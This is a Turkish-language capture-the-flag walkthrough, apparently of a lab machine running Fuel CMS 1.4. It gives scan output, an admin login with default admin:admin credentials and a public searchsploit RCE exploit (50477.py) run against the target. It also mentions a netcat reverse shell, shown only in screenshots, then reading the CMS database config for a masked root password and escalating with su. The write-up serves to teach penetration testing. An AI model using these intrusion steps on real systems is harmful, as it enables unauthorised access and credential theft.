Öncelikle bir Rustscan taraması yapıldı.Sebebi ise nmap taramasına göre biraz daha hızlı sonuç verdiği için.Rustscan ile yapılan taramada gördüğümüz portları nmap taraması yaparken detaylıca kullanabiliriz

```bash
rustscan -a 10.10.123.74
```
```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.123.74:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 08:42 EDT
Initiating Ping Scan at 08:42
Scanning 10.10.123.74 [4 ports]
Completed Ping Scan at 08:42, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:42
Completed Parallel DNS resolution of 1 host. at 08:42, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:42
Scanning 10.10.123.74 [1 port]
Discovered open port 80/tcp on 10.10.123.74
Completed SYN Stealth Scan at 08:42, 0.19s elapsed (1 total ports)
Nmap scan report for 10.10.123.74
Host is up, received reset ttl 63 (0.33s latency).
Scanned at 2025-07-24 08:42:58 EDT for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
```
Rustscan çıktısına göre 80 portunun açık olduğunu ve http çalıştığını gördük sonrasında biraz daha detay için nmap taraması yapıldı.
---

```bash

nmap -Pn -sV -A 10.10.190.125 -p 80
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:16 EDT
Nmap scan report for 10.10.190.125
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.4 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (96%), Linux 3.2 - 4.14 (96%), Linux 5.4 (96%), Linux 4.15 (95%), Linux 4.15 - 5.19 (95%), Linux 3.10 - 3.13 (95%), Linux 2.6.32 - 3.10 (95%), Linux 3.10 - 4.11 (94%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   84.55 ms 10.9.0.1
2   84.64 ms 10.10.190.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds

```
Nmap taramasında sonra elimizde çıktıyı analiz ettik robots.txt olduğunu gördük ve websitesini ziyaret ettik

<img width="825" height="694" alt="fuelcms" src="https://github.com/user-attachments/assets/332593a0-54d2-4bce-8c37-de121ce11e7c" />

<img width="602" height="471" alt="credential" src="https://github.com/user-attachments/assets/138e50f7-a454-44c6-adb9-48919f75b43a" />

Gözümüze ilk başta versiyon bilgisi çarpıyor ve versiyonun 1.4 olduğunu öğreniyoruz sonrasında sayfanın aşağısına indiğimizde bir parola ve veritabanı ile ilgili bir dosya yolu olduğunu görüyoruz bunları notlarımıza kaydedip robots.txtye bakıyoruz.

<img width="100" height="36" alt="robots txt" src="https://github.com/user-attachments/assets/dcb761a6-bcbe-49f3-a95b-2ef745ec0239" />

Robots.txt nin yönlendirdiği sayfaya gidince bir login paneli ile karşılaşıyoruz

<img width="715" height="601" alt="login" src="https://github.com/user-attachments/assets/98631993-a425-406e-9202-f0c61e3e65ae" />

Websitesini ilk ziyaret ettiğimizde gördüğümüz kullanıcı adı parolayı admin:admin burada deniyoruz ve panele giriş yapıyoruz.

<img width="1686" height="838" alt="dashboard" src="https://github.com/user-attachments/assets/c9911c55-5f4f-4488-86c1-15757fd4ca73" />

Sonrasında searchsploit kullanarak bir arama yapıyoruz cms versiyonu hakkında.

```bash
searchsploit Fuel CMS 1.4
```
```bash
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                     | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                     | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                                     | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                                                    | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                           | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                               | php/webapps/48778.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Ve bir RCE zaafiyeti olduğunu görüyoruz sonrasında bu py dosyasını localimize almak için -m parametresini kullanıyoruz

```bash
searhcsploit -m 50477.py
```
Sonrasında python dosyamızı çalıştırıyoruz

```bash
python3 50477.py -u http://<your_machine_ip>/
```

<img width="591" height="371" alt="nc" src="https://github.com/user-attachments/assets/85929737-e213-49d5-a7c8-d2193a300c34" />

sisten üzerinde nc çalıştığını görüyoruz ve revshell üretiyoruz kendimize

<img width="1114" height="638" alt="revshell" src="https://github.com/user-attachments/assets/a2f5415f-4a0f-4f8c-a9b8-575e22fdfbe2" />

oluşan payload kullanıyoruz

<img width="729" height="52" alt="paylaod" src="https://github.com/user-attachments/assets/c8dc7679-a033-4866-a3e0-973c088c0d09" />

Ve bağlantımızı rlwrap nc ile alıyoruz

<img width="519" height="91" alt="shell" src="https://github.com/user-attachments/assets/8b5371d7-5bde-4fe5-afd3-4e1f3ada247a" />

Home dizini altında ilk bayrağı alıyoruz

```bash
$ cd /home
$ ls
www-data
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
6470xxxxxxxxxxxxxxx ==> :)
$ 

```
Sonrasıda notlarımızda olan veritabanı hakkında bilgi veren dosya yolunu okumaya çalışıyoruz.

```bash
$ cat fuel/application/config/database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => '******', ==> :)
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
$ 

```
Burdan aldığımız bilgiler ile root kullanıcına erişiyoruz.

```bash
www-data@ubuntu:/home$ su root
su root
Password: xxxxxx ==> :)

root@ubuntu:/home# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat roo
cat root.txt 
b9bbxxxxxxxxxxxxxxxx ==> :)
root@ubuntu:~# 

```
